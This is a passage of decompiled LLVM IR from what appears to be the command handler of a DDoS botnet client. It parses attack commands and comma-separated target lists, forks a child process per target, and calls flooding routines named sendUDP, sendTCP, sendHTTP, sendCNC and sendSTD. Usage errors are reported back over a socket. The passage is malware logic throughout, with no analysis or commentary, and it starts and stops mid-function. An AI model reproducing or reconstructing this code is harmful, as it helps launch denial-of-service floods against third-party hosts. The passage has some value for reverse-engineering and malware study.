dec_label_pc_fd24:                                ; preds = %dec_label_pc_fd10
  %v1_fd28 = add i32 %tmp, 32
  %v1_fd2c = inttoptr i32 %v1_fd28 to i32*
  %v2_fd2c = load i32, i32* %v1_fd2c, align 4
  store i32 %v2_fd2c, i32* @r0, align 4
  %v1_fd34 = call i32 @atol(i32 %v2_fd2c)
  br label %dec_label_pc_fd48

dec_label_pc_fd40:                                ; preds = %dec_label_pc_fd10
  br label %dec_label_pc_fd48

dec_label_pc_fd48:                                ; preds = %dec_label_pc_fd24, %dec_label_pc_fd40
  %storemerge8 = phi i32 [ 0, %dec_label_pc_fd40 ], [ %v1_fd34, %dec_label_pc_fd24 ]
  store i32 %v2_fc24, i32* @r0, align 4
  %v2_fd5c = call i32 @__GI_strchr(i32 %v2_fc24, i32 44)
  store i32 %v2_fd5c, i32* @r0, align 4
  %v2_fd64 = icmp eq i32 %v2_fd5c, 0
  br i1 %v2_fd64, label %dec_label_pc_fdf8, label %dec_label_pc_fd6c

dec_label_pc_fd6c:                                ; preds = %dec_label_pc_fd48
  store i32 %v2_fc24, i32* @r0, align 4
  %v2_fd78 = call i32 @__GI_strtok(i32 %v2_fc24, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  store i32 %v2_fd78, i32* @r0, align 4
  %v2_fdec34 = icmp eq i32 %v2_fd78, 0
  br i1 %v2_fdec34, label %dec_label_pc_10860, label %dec_label_pc_fd88

dec_label_pc_fd88:                                ; preds = %dec_label_pc_fd6c, %dec_label_pc_fdd4
  %storemerge2135 = phi i32 [ %v2_fddc, %dec_label_pc_fdd4 ], [ %v2_fd78, %dec_label_pc_fd6c ]
  %v0_fd88 = call i32 @listFork()
  %v2_fd90 = icmp eq i32 %v0_fd88, 0
  br i1 %v2_fd90, label %dec_label_pc_fd98, label %dec_label_pc_fdd4

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fd88
  %v8_fdc8 = call i32 @sendUDP(i32 %storemerge2135, i32 %v1_fc3c, i32 %v1_fc58, i32 %v1_fc74, i32 %v1_fc90, i32 %storemerge10, i32 %storemerge9, i32 %storemerge8)
  %v1_fdd0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_fdd4

dec_label_pc_fdd4:                                ; preds = %dec_label_pc_fd88, %dec_label_pc_fd98
  store i32 0, i32* @r0, align 4
  %v2_fddc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  store i32 %v2_fddc, i32* @r0, align 4
  %v2_fdec = icmp eq i32 %v2_fddc, 0
  br i1 %v2_fdec, label %dec_label_pc_10860, label %dec_label_pc_fd88

dec_label_pc_fdf8:                                ; preds = %dec_label_pc_fd48
  %v0_fdf8 = call i32 @listFork()
  %v2_fe00 = icmp eq i32 %v0_fdf8, 0
  br i1 %v2_fe00, label %dec_label_pc_fe08, label %dec_label_pc_10860

dec_label_pc_fe08:                                ; preds = %dec_label_pc_fdf8
  %v8_fe38 = call i32 @sendUDP(i32 %v2_fc24, i32 %v1_fc3c, i32 %v1_fc58, i32 %v1_fc74, i32 %v1_fc90, i32 %storemerge10, i32 %storemerge9, i32 %storemerge8)
  %v1_fe40 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_fe44

dec_label_pc_fe44:                                ; preds = %dec_label_pc_fac4, %dec_label_pc_fe08
  %v2_fe48 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_262b8.902 to i32), i32* @r1, align 4
  %v3_fe54 = inttoptr i32 %v2_fe48 to i8*
  %v4_fe54 = call i32 @__GI_strcoll(i8* %v3_fe54, i32 ptrtoint ([4 x i8]* @global_var_262b8.902 to i32))
  %v2_fe5c = icmp eq i32 %v4_fe54, 0
  br i1 %v2_fe5c, label %dec_label_pc_fe64, label %dec_label_pc_10128

dec_label_pc_fe64:                                ; preds = %dec_label_pc_fe44
  %v7_fe6c = icmp slt i32 %arg1, 6
  br i1 %v7_fe6c, label %dec_label_pc_ff48, label %dec_label_pc_fe70

dec_label_pc_fe70:                                ; preds = %dec_label_pc_fe64
  %v1_fe74 = add i32 %tmp, 12
  %v1_fe78 = inttoptr i32 %v1_fe74 to i32*
  %v2_fe78 = load i32, i32* %v1_fe78, align 4
  store i32 %v2_fe78, i32* @r0, align 4
  %v1_fe80 = call i32 @atol(i32 %v2_fe78)
  %v7_fe88 = icmp eq i32 %v1_fe80, -1
  br i1 %v7_fe88, label %dec_label_pc_ff48, label %dec_label_pc_fe90

dec_label_pc_fe90:                                ; preds = %dec_label_pc_fe70
  %v1_fe94 = add i32 %tmp, 8
  %v1_fe98 = inttoptr i32 %v1_fe94 to i32*
  %v2_fe98 = load i32, i32* %v1_fe98, align 4
  store i32 %v2_fe98, i32* @r0, align 4
  %v1_fea0 = call i32 @atol(i32 %v2_fe98)
  %v7_fea8 = icmp eq i32 %v1_fea0, -1
  br i1 %v7_fea8, label %dec_label_pc_ff48, label %dec_label_pc_feb0

dec_label_pc_feb0:                                ; preds = %dec_label_pc_fe90
  %v1_feb4 = add i32 %tmp, 16
  %v1_feb8 = inttoptr i32 %v1_feb4 to i32*
  %v2_feb8 = load i32, i32* %v1_feb8, align 4
  store i32 %v2_feb8, i32* @r0, align 4
  %v1_fec0 = call i32 @atol(i32 %v2_feb8)
  %v7_fec8 = icmp eq i32 %v1_fec0, -1
  br i1 %v7_fec8, label %dec_label_pc_ff48, label %dec_label_pc_fed0

dec_label_pc_fed0:                                ; preds = %dec_label_pc_feb0
  %v2_fed8 = load i32, i32* %v1_feb8, align 4
  store i32 %v2_fed8, i32* @r0, align 4
  %v1_fee0 = call i32 @atol(i32 %v2_fed8)
  %v8_feec = icmp sgt i32 %v1_fee0, 32
  br i1 %v8_feec, label %dec_label_pc_ff48, label %dec_label_pc_fef0

dec_label_pc_fef0:                                ; preds = %dec_label_pc_fed0
  %v7_fef8 = icmp slt i32 %arg1, 7
  br i1 %v7_fef8, label %dec_label_pc_ff1c, label %dec_label_pc_fefc

dec_label_pc_fefc:                                ; preds = %dec_label_pc_fef0
  %v1_ff00 = add i32 %tmp, 24
  %v1_ff04 = inttoptr i32 %v1_ff00 to i32*
  %v2_ff04 = load i32, i32* %v1_ff04, align 4
  store i32 %v2_ff04, i32* @r0, align 4
  %v1_ff0c = call i32 @atol(i32 %v2_ff04)
  %v1_ff14 = icmp slt i32 %v1_ff0c, 0
  br i1 %v1_ff14, label %dec_label_pc_ff48, label %dec_label_pc_ff1c

dec_label_pc_ff1c:                                ; preds = %dec_label_pc_fefc, %dec_label_pc_fef0
  %v7_ff20 = icmp eq i32 %arg1, 8
  br i1 %v7_ff20, label %dec_label_pc_ff28, label %dec_label_pc_ff60

dec_label_pc_ff28:                                ; preds = %dec_label_pc_ff1c
  %v1_ff2c = add i32 %tmp, 28
  %v1_ff30 = inttoptr i32 %v1_ff2c to i32*
  %v2_ff30 = load i32, i32* %v1_ff30, align 4
  store i32 %v2_ff30, i32* @r0, align 4
  %v1_ff38 = call i32 @atol(i32 %v2_ff30)
  %v5_ff44 = icmp sgt i32 %v1_ff38, 0
  br i1 %v5_ff44, label %dec_label_pc_ff60, label %dec_label_pc_ff48

dec_label_pc_ff48:                                ; preds = %dec_label_pc_ff28, %dec_label_pc_fefc, %dec_label_pc_fed0, %dec_label_pc_feb0, %dec_label_pc_fe90, %dec_label_pc_fe70, %dec_label_pc_fe64
  %v2_ff4c = load i32, i32* @global_var_28570.50, align 4
  %v3_ff58 = call i32 @sockprintf(i32 %v2_ff4c, i32 ptrtoint ([186 x i8]* @global_var_262bc.904 to i32))
  br label %dec_label_pc_10860

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff1c, %dec_label_pc_ff28
  %v1_ff64 = add i32 %tmp, 4
  %v1_ff68 = inttoptr i32 %v1_ff64 to i32*
  %v2_ff68 = load i32, i32* %v1_ff68, align 4
  %v2_ff78 = load i32, i32* %v1_fe98, align 4
  store i32 %v2_ff78, i32* @r0, align 4
  %v1_ff80 = call i32 @atol(i32 %v2_ff78)
  %v2_ff94 = load i32, i32* %v1_fe78, align 4
  store i32 %v2_ff94, i32* @r0, align 4
  %v1_ff9c = call i32 @atol(i32 %v2_ff94)
  %v2_ffb0 = load i32, i32* %v1_feb8, align 4
  store i32 %v2_ffb0, i32* @r0, align 4
  %v1_ffb8 = call i32 @atol(i32 %v2_ffb0)
  %v1_ffc8 = add i32 %tmp, 20
  %v1_ffcc = inttoptr i32 %v1_ffc8 to i32*
  %v2_ffcc = load i32, i32* %v1_ffcc, align 4
  br i1 %v7_ff20, label %dec_label_pc_ffe0, label %dec_label_pc_fffc

dec_label_pc_ffe0:                                ; preds = %dec_label_pc_ff60
  %v1_ffe4 = add i32 %tmp, 28
  %v1_ffe8 = inttoptr i32 %v1_ffe4 to i32*
  %v2_ffe8 = load i32, i32* %v1_ffe8, align 4
  store i32 %v2_ffe8, i32* @r0, align 4
  %v1_fff0 = call i32 @atol(i32 %v2_ffe8)
  br label %dec_label_pc_10004

dec_label_pc_fffc:                                ; preds = %dec_label_pc_ff60
  br label %dec_label_pc_10004

dec_label_pc_10004:                               ; preds = %dec_label_pc_ffe0, %dec_label_pc_fffc
  %storemerge7 = phi i32 [ 10, %dec_label_pc_fffc ], [ %v1_fff0, %dec_label_pc_ffe0 ]
  br i1 %v7_fef8, label %dec_label_pc_10034, label %dec_label_pc_10018

dec_label_pc_10018:                               ; preds = %dec_label_pc_10004
  %v1_1001c = add i32 %tmp, 24
  %v1_10020 = inttoptr i32 %v1_1001c to i32*
  %v2_10020 = load i32, i32* %v1_10020, align 4
  store i32 %v2_10020, i32* @r0, align 4
  %v1_10028 = call i32 @atol(i32 %v2_10020)
  br label %dec_label_pc_1003c

dec_label_pc_10034:                               ; preds = %dec_label_pc_10004
  br label %dec_label_pc_1003c

dec_label_pc_1003c:                               ; preds = %dec_label_pc_10018, %dec_label_pc_10034
  %storemerge6 = phi i32 [ 0, %dec_label_pc_10034 ], [ %v1_10028, %dec_label_pc_10018 ]
  store i32 %v2_ff68, i32* @r0, align 4
  %v2_10050 = call i32 @__GI_strchr(i32 %v2_ff68, i32 44)
  store i32 %v2_10050, i32* @r0, align 4
  %v2_10058 = icmp eq i32 %v2_10050, 0
  br i1 %v2_10058, label %dec_label_pc_100e4, label %dec_label_pc_10060

dec_label_pc_10060:                               ; preds = %dec_label_pc_1003c
  store i32 %v2_ff68, i32* @r0, align 4
  %v2_1006c = call i32 @__GI_strtok(i32 %v2_ff68, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  store i32 %v2_1006c, i32* @r0, align 4
  %v2_100d831 = icmp eq i32 %v2_1006c, 0
  br i1 %v2_100d831, label %dec_label_pc_10128, label %dec_label_pc_1007c

dec_label_pc_1007c:                               ; preds = %dec_label_pc_10060, %dec_label_pc_100c0
  %storemerge1932 = phi i32 [ %v2_100c8, %dec_label_pc_100c0 ], [ %v2_1006c, %dec_label_pc_10060 ]
  %v0_1007c = call i32 @listFork()
  %v2_10084 = icmp eq i32 %v0_1007c, 0
  br i1 %v2_10084, label %dec_label_pc_1008c, label %dec_label_pc_100c0

dec_label_pc_1008c:                               ; preds = %dec_label_pc_1007c
  %v7_100b4 = call i32 @sendTCP(i32 %storemerge1932, i32 %v1_ff80, i32 %v1_ff9c, i32 %v1_ffb8, i32 %v2_ffcc, i32 %storemerge6, i32 %storemerge7)
  %v1_100bc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100c0

dec_label_pc_100c0:                               ; preds = %dec_label_pc_1007c, %dec_label_pc_1008c
  store i32 0, i32* @r0, align 4
  %v2_100c8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  store i32 %v2_100c8, i32* @r0, align 4
  %v2_100d8 = icmp eq i32 %v2_100c8, 0
  br i1 %v2_100d8, label %dec_label_pc_10128, label %dec_label_pc_1007c

dec_label_pc_100e4:                               ; preds = %dec_label_pc_1003c
  %v0_100e4 = call i32 @listFork()
  %v2_100ec = icmp eq i32 %v0_100e4, 0
  br i1 %v2_100ec, label %dec_label_pc_100f4, label %dec_label_pc_10128

dec_label_pc_100f4:                               ; preds = %dec_label_pc_100e4
  %v7_1011c = call i32 @sendTCP(i32 %v2_ff68, i32 %v1_ff80, i32 %v1_ff9c, i32 %v1_ffb8, i32 %v2_ffcc, i32 %storemerge6, i32 %storemerge7)
  %v1_10124 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10128

dec_label_pc_10128:                               ; preds = %dec_label_pc_100c0, %dec_label_pc_10060, %dec_label_pc_100e4, %dec_label_pc_fe44, %dec_label_pc_100f4
  %v2_1012c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_26378.906 to i32), i32* @r1, align 4
  %v3_10138 = inttoptr i32 %v2_1012c to i8*
  %v4_10138 = call i32 @__GI_strcoll(i8* %v3_10138, i32 ptrtoint ([5 x i8]* @global_var_26378.906 to i32))
  %v2_10140 = icmp eq i32 %v4_10138, 0
  br i1 %v2_10140, label %dec_label_pc_10148, label %dec_label_pc_10320

dec_label_pc_10148:                               ; preds = %dec_label_pc_10128
  %v7_10150 = icmp slt i32 %arg1, 6
  br i1 %v7_10150, label %dec_label_pc_10860, label %dec_label_pc_10154

dec_label_pc_10154:                               ; preds = %dec_label_pc_10148
  %v1_10158 = add i32 %tmp, 4
  %v1_1015c = inttoptr i32 %v1_10158 to i32*
  %v2_1015c = load i32, i32* %v1_1015c, align 4
  store i32 %v2_1015c, i32* @r0, align 4
  %v2_10168 = call i32 @__GI_strchr(i32 %v2_1015c, i32 44)
  store i32 %v2_10168, i32* @r0, align 4
  %v2_10170 = icmp eq i32 %v2_10168, 0
  br i1 %v2_10170, label %dec_label_pc_10270, label %dec_label_pc_10178

dec_label_pc_10178:                               ; preds = %dec_label_pc_10154
  %v2_10180 = load i32, i32* %v1_1015c, align 4
  store i32 %v2_10180, i32* @r0, align 4
  %v2_1018c = call i32 @__GI_strtok(i32 %v2_10180, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  store i32 %v2_1018c, i32* @r0, align 4
  %v2_1026429 = icmp eq i32 %v2_1018c, 0
  br i1 %v2_1026429, label %dec_label_pc_10320, label %dec_label_pc_1019c.lr.ph

dec_label_pc_1019c.lr.ph:                         ; preds = %dec_label_pc_10178
  %v1_101bc = add i32 %tmp, 8
  %v1_101c0 = inttoptr i32 %v1_101bc to i32*
  %v1_101cc = add i32 %tmp, 12
  %v1_101d0 = inttoptr i32 %v1_101cc to i32*
  %v1_101ec = add i32 %tmp, 16
  %v1_101f0 = inttoptr i32 %v1_101ec to i32*
  %v1_101fc = add i32 %tmp, 20
  %v1_10200 = inttoptr i32 %v1_101fc to i32*
  %v1_10214 = add i32 %tmp, 24
  %v1_10218 = inttoptr i32 %v1_10214 to i32*
  br label %dec_label_pc_1019c

dec_label_pc_1019c:                               ; preds = %dec_label_pc_1019c.lr.ph, %dec_label_pc_1024c
  %v0_1019c = call i32 @listFork()
  %v2_101a4 = icmp eq i32 %v0_1019c, 0
  br i1 %v2_101a4, label %dec_label_pc_101ac, label %dec_label_pc_1024c

dec_label_pc_101ac:                               ; preds = %dec_label_pc_1019c
  %v2_101b4 = load i32, i32* %v1_1015c, align 4
  store i32 %v2_101b4, i32* @r5, align 4
  %v2_101c0 = load i32, i32* %v1_101c0, align 4
  store i32 %v2_101c0, i32* @r6, align 4
  %v2_101d0 = load i32, i32* %v1_101d0, align 4
  store i32 %v2_101d0, i32* @r0, align 4
  %v1_101d8 = call i32 @atol(i32 %v2_101d0)
  %v3_101e4 = urem i32 %v1_101d8, 65536
  store i32 %v3_101e4, i32* @r7, align 4
  %v2_101f0 = load i32, i32* %v1_101f0, align 4
  store i32 %v2_101f0, i32* @r8, align 4
  %v2_10200 = load i32, i32* %v1_10200, align 4
  store i32 %v2_10200, i32* @r0, align 4
  %v1_10208 = call i32 @atol(i32 %v2_10200)
  store i32 %v1_10208, i32* @r4, align 4
  %v2_10218 = load i32, i32* %v1_10218, align 4
  store i32 %v2_10218, i32* @r0, align 4
  %v1_10220 = call i32 @atol(i32 %v2_10218)
  %v0_10228 = load i32, i32* @r4, align 4
  %v0_10230 = load i32, i32* @r5, align 4
  %v0_10234 = load i32, i32* @r6, align 4
  %v0_10238 = load i32, i32* @r7, align 4
  %v0_1023c = load i32, i32* @r8, align 4
  %v6_10240 = trunc i32 %v0_10238 to i16
  %v7_10240 = call i32 @sendHTTP(i32 %v0_10230, i32 %v0_10234, i16 %v6_10240, i32 %v0_1023c, i32 %v0_10228, i32 %v1_10220)
  %v1_10248 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1024c

dec_label_pc_1024c:                               ; preds = %dec_label_pc_1019c, %dec_label_pc_101ac
  store i32 0, i32* @r0, align 4
  %v2_10254 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  store i32 %v2_10254, i32* @r0, align 4
  %v2_10264 = icmp eq i32 %v2_10254, 0
  br i1 %v2_10264, label %dec_label_pc_10320, label %dec_label_pc_1019c

dec_label_pc_10270:                               ; preds = %dec_label_pc_10154
  %v0_10270 = call i32 @listFork()
  %v2_10278 = icmp eq i32 %v0_10270, 0
  br i1 %v2_10278, label %dec_label_pc_10280, label %dec_label_pc_10860

dec_label_pc_10280:                               ; preds = %dec_label_pc_10270
  %v2_10288 = load i32, i32* %v1_1015c, align 4
  store i32 %v2_10288, i32* @r5, align 4
  %v1_10290 = add i32 %tmp, 8
  %v1_10294 = inttoptr i32 %v1_10290 to i32*
  %v2_10294 = load i32, i32* %v1_10294, align 4
  store i32 %v2_10294, i32* @r6, align 4
  %v1_102a0 = add i32 %tmp, 12
  %v1_102a4 = inttoptr i32 %v1_102a0 to i32*
  %v2_102a4 = load i32, i32* %v1_102a4, align 4
  store i32 %v2_102a4, i32* @r0, align 4
  %v1_102ac = call i32 @atol(i32 %v2_102a4)
  %v3_102b8 = urem i32 %v1_102ac, 65536
  store i32 %v3_102b8, i32* @r7, align 4
  %v1_102c0 = add i32 %tmp, 16
  %v1_102c4 = inttoptr i32 %v1_102c0 to i32*
  %v2_102c4 = load i32, i32* %v1_102c4, align 4
  store i32 %v2_102c4, i32* @r8, align 4
  %v1_102d0 = add i32 %tmp, 20
  %v1_102d4 = inttoptr i32 %v1_102d0 to i32*
  %v2_102d4 = load i32, i32* %v1_102d4, align 4
  store i32 %v2_102d4, i32* @r0, align 4
  %v1_102dc = call i32 @atol(i32 %v2_102d4)
  store i32 %v1_102dc, i32* @r4, align 4
  %v1_102e8 = add i32 %tmp, 24
  %v1_102ec = inttoptr i32 %v1_102e8 to i32*
  %v2_102ec = load i32, i32* %v1_102ec, align 4
  store i32 %v2_102ec, i32* @r0, align 4
  %v1_102f4 = call i32 @atol(i32 %v2_102ec)
  %v0_102fc = load i32, i32* @r4, align 4
  %v0_10304 = load i32, i32* @r5, align 4
  %v0_10308 = load i32, i32* @r6, align 4
  %v0_1030c = load i32, i32* @r7, align 4
  %v0_10310 = load i32, i32* @r8, align 4
  %v6_10314 = trunc i32 %v0_1030c to i16
  %v7_10314 = call i32 @sendHTTP(i32 %v0_10304, i32 %v0_10308, i16 %v6_10314, i32 %v0_10310, i32 %v0_102fc, i32 %v1_102f4)
  %v1_1031c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10320

dec_label_pc_10320:                               ; preds = %dec_label_pc_1024c, %dec_label_pc_10178, %dec_label_pc_10128, %dec_label_pc_10280
  %v2_10324 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_26380.908 to i32), i32* @r1, align 4
  %v3_10330 = inttoptr i32 %v2_10324 to i8*
  %v4_10330 = call i32 @__GI_strcoll(i8* %v3_10330, i32 ptrtoint ([4 x i8]* @global_var_26380.908 to i32))
  %v2_10338 = icmp eq i32 %v4_10330, 0
  br i1 %v2_10338, label %dec_label_pc_10340, label %dec_label_pc_104a8

dec_label_pc_10340:                               ; preds = %dec_label_pc_10320
  %v7_10348 = icmp slt i32 %arg1, 4
  br i1 %v7_10348, label %dec_label_pc_1038c, label %dec_label_pc_1034c

dec_label_pc_1034c:                               ; preds = %dec_label_pc_10340
  %v1_10350 = add i32 %tmp, 8
  %v1_10354 = inttoptr i32 %v1_10350 to i32*
  %v2_10354 = load i32, i32* %v1_10354, align 4
  store i32 %v2_10354, i32* @r0, align 4
  %v1_1035c = call i32 @atol(i32 %v2_10354)
  %tmp96 = icmp slt i32 %v1_1035c, 1
  br i1 %tmp96, label %dec_label_pc_1038c, label %dec_label_pc_1036c

dec_label_pc_1036c:                               ; preds = %dec_label_pc_1034c
  %v1_10370 = add i32 %tmp, 12
  %v1_10374 = inttoptr i32 %v1_10370 to i32*
  %v2_10374 = load i32, i32* %v1_10374, align 4
  store i32 %v2_10374, i32* @r0, align 4
  %v1_1037c = call i32 @atol(i32 %v2_10374)
  %v5_10388 = icmp sgt i32 %v1_1037c, 0
  br i1 %v5_10388, label %dec_label_pc_103a4, label %dec_label_pc_1038c

dec_label_pc_1038c:                               ; preds = %dec_label_pc_1036c, %dec_label_pc_1034c, %dec_label_pc_10340
  %v2_10390 = load i32, i32* @global_var_28570.50, align 4
  %v3_1039c = call i32 @sockprintf(i32 %v2_10390, i32 ptrtoint ([27 x i8]* @global_var_26384.910 to i32))
  br label %dec_label_pc_10860

dec_label_pc_103a4:                               ; preds = %dec_label_pc_1036c
  %v1_103a8 = add i32 %tmp, 4
  %v1_103ac = inttoptr i32 %v1_103a8 to i32*
  %v2_103ac = load i32, i32* %v1_103ac, align 4
  %v2_103bc = load i32, i32* %v1_10354, align 4
  store i32 %v2_103bc, i32* @r0, align 4
  %v1_103c4 = call i32 @atol(i32 %v2_103bc)
  %v2_103d8 = load i32, i32* %v1_10374, align 4
  store i32 %v2_103d8, i32* @r0, align 4
  %v1_103e0 = call i32 @atol(i32 %v2_103d8)
  store i32 %v2_103ac, i32* @r0, align 4
  %v2_103f8 = call i32 @__GI_strchr(i32 %v2_103ac, i32 44)
  store i32 %v2_103f8, i32* @r0, align 4
  %v2_10400 = icmp eq i32 %v2_103f8, 0
  br i1 %v2_10400, label %dec_label_pc_10480, label %dec_label_pc_10408

dec_label_pc_10408:                               ; preds = %dec_label_pc_103a4
  store i32 %v2_103ac, i32* @r0, align 4
  %v2_10414 = call i32 @__GI_strtok(i32 %v2_103ac, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  store i32 %v2_10414, i32* @r0, align 4
  %v2_1047426 = icmp eq i32 %v2_10414, 0
  br i1 %v2_1047426, label %dec_label_pc_104a8, label %dec_label_pc_10424

dec_label_pc_10424:                               ; preds = %dec_label_pc_10408, %dec_label_pc_1045c
  %storemerge1527 = phi i32 [ %v2_10464, %dec_label_pc_1045c ], [ %v2_10414, %dec_label_pc_10408 ]
  %v0_10424 = call i32 @listFork()
  %v2_1042c = icmp eq i32 %v0_10424, 0
  br i1 %v2_1042c, label %dec_label_pc_10434, label %dec_label_pc_1045c

dec_label_pc_10434:                               ; preds = %dec_label_pc_10424
  %v4_10440 = call i32 @sendCNC(i32 %storemerge1527, i32 %v1_103c4, i32 %v1_103e0, i32 0)
  %v2_10448 = load i32, i32* @global_var_28570.50, align 4
  %v1_10450 = call i32 @__GI_close(i32 %v2_10448)
  %v1_10458 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1045c

dec_label_pc_1045c:                               ; preds = %dec_label_pc_10424, %dec_label_pc_10434
  store i32 0, i32* @r0, align 4
  %v2_10464 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  store i32 %v2_10464, i32* @r0, align 4
  %v2_10474 = icmp eq i32 %v2_10464, 0
  br i1 %v2_10474, label %dec_label_pc_104a8, label %dec_label_pc_10424

dec_label_pc_10480:                               ; preds = %dec_label_pc_103a4
  %v0_10480 = call i32 @listFork()
  %v2_10488 = icmp eq i32 %v0_10480, 0
  br i1 %v2_10488, label %dec_label_pc_10490, label %dec_label_pc_10860

dec_label_pc_10490:                               ; preds = %dec_label_pc_10480
  %v4_1049c = call i32 @sendCNC(i32 %v2_103ac, i32 %v1_103c4, i32 %v1_103e0, i32 0)
  %v1_104a4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_104a8

dec_label_pc_104a8:                               ; preds = %dec_label_pc_1045c, %dec_label_pc_10408, %dec_label_pc_10320, %dec_label_pc_10490
  %v2_104ac = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_263a0.912 to i32), i32* @r1, align 4
  %v3_104b8 = inttoptr i32 %v2_104ac to i8*
  %v4_104b8 = call i32 @__GI_strcoll(i8* %v3_104b8, i32 ptrtoint ([4 x i8]* @global_var_263a0.912 to i32))
  %v2_104c0 = icmp eq i32 %v4_104b8, 0
  br i1 %v2_104c0, label %dec_label_pc_104c8, label %dec_label_pc_106e4

dec_label_pc_104c8:                               ; preds = %dec_label_pc_104a8
  %v7_104d0 = icmp slt i32 %arg1, 4
  br i1 %v7_104d0, label %dec_label_pc_10514, label %dec_label_pc_104d4

dec_label_pc_104d4:                               ; preds = %dec_label_pc_104c8
  %v1_104d8 = add i32 %tmp, 8
  %v1_104dc = inttoptr i32 %v1_104d8 to i32*
  %v2_104dc = load i32, i32* %v1_104dc, align 4
  store i32 %v2_104dc, i32* @r0, align 4
  %v1_104e4 = call i32 @atol(i32 %v2_104dc)
  %tmp97 = icmp slt i32 %v1_104e4, 1
  br i1 %tmp97, label %dec_label_pc_10514, label %dec_label_pc_104f4

dec_label_pc_104f4:                               ; preds = %dec_label_pc_104d4
  %v1_104f8 = add i32 %tmp, 12
  %v1_104fc = inttoptr i32 %v1_104f8 to i32*
  %v2_104fc = load i32, i32* %v1_104fc, align 4
  store i32 %v2_104fc, i32* @r0, align 4
  %v1_10504 = call i32 @atol(i32 %v2_104fc)
  %v5_10510 = icmp sgt i32 %v1_10504, 0
  br i1 %v5_10510, label %dec_label_pc_1052c, label %dec_label_pc_10514

dec_label_pc_10514:                               ; preds = %dec_label_pc_104f4, %dec_label_pc_104d4, %dec_label_pc_104c8
  %v2_10518 = load i32, i32* @global_var_28570.50, align 4
  %v3_10524 = call i32 @sockprintf(i32 %v2_10518, i32 ptrtoint ([27 x i8]* @global_var_263a4.914 to i32))
  br label %dec_label_pc_10860

dec_label_pc_1052c:                               ; preds = %dec_label_pc_104f4
  %v1_10530 = add i32 %tmp, 4
  %v1_10534 = inttoptr i32 %v1_10530 to i32*
  %v2_10534 = load i32, i32* %v1_10534, align 4
  %v2_10544 = load i32, i32* %v1_104dc, align 4
  store i32 %v2_10544, i32* @r0, align 4
  %v1_1054c = call i32 @atol(i32 %v2_10544)
  %v2_10560 = load i32, i32* %v1_104fc, align 4
  store i32 %v2_10560, i32* @r0, align 4
  %v1_10568 = call i32 @atol(i32 %v2_10560)
  store i32 %v2_10534, i32* @r0, align 4
  %v2_10580 = call i32 @__GI_strchr(i32 %v2_10534, i32 44)
  store i32 %v2_10580, i32* @r0, align 4
  %v2_10588 = icmp eq i32 %v2_10580, 0
  br i1 %v2_10588, label %dec_label_pc_106bc, label %dec_label_pc_10590

dec_label_pc_10590:                               ; preds = %dec_label_pc_1052c
  store i32 %v2_10534, i32* @r0, align 4
  %v2_1059c = call i32 @__GI_strtok(i32 %v2_10534, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  store i32 %v2_1059c, i32* @r0, align 4
  %v2_106b023 = icmp eq i32 %v2_1059c, 0
  br i1 %v2_106b023, label %dec_label_pc_106e4, label %dec_label_pc_10670

dec_label_pc_10670:                               ; preds = %dec_label_pc_10590, %dec_label_pc_10698
  %storemerge1324 = phi i32 [ %v2_106a0, %dec_label_pc_10698 ], [ %v2_1059c, %dec_label_pc_10590 ]
  %v0_10670 = call i32 @listFork()
  %v2_10678 = icmp eq i32 %v0_10670, 0
  br i1 %v2_10678, label %dec_label_pc_10680, label %dec_label_pc_10698

dec_label_pc_10680:                               ; preds = %dec_label_pc_10670
  %v4_1068c = call i32 @sendSTD(i32 %storemerge1324, i32 %v1_1054c, i32 %v1_10568, i32 0)
  %v1_10694 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %dec_label_pc_10670, %dec_label_pc_10680
  store i32 0, i32* @r0, align 4
  %v2_106a0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1e878.403 to i32))
  store i32 %v2_106a0, i32* @r0, align 4
  %v2_106b0 = icmp eq i32 %v2_106a0, 0
  br i1 %v2_106b0, label %dec_label_pc_106e4, label %dec_label_pc_10670

dec_label_pc_106bc:                               ; preds = %dec_label_pc_1052c
  %v0_106bc = call i32 @listFork()
  %v2_106c4 = icmp eq i32 %v0_106bc, 0
  br i1 %v2_106c4, label %dec_label_pc_106cc, label %dec_label_pc_10860

dec_label_pc_106cc:                               ; preds = %dec_label_pc_106bc
  %v4_106d8 = call i32 @sendSTD(i32 %v2_10534, i32 %v1_1054c, i32 %v1_10568, i32 0)
  %v1_106e0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_106e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_10698, %dec_label_pc_10590, %dec_label_pc_104a8, %dec_label_pc_106cc
  %v2_106e8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_263c0.916 to i32), i32* @r1, align 4
  %v3_106f4 = inttoptr i32 %v2_106e8 to i8*
  %v4_106f4 = call i32 @__GI_strcoll(i8* %v3_106f4, i32 ptrtoint ([9 x i8]* @global_var_263c0.916 to i32))
  store i32 %v4_106f4, i32* @r0, align 4
  %v2_106fc = icmp eq i32 %v4_106f4, 0
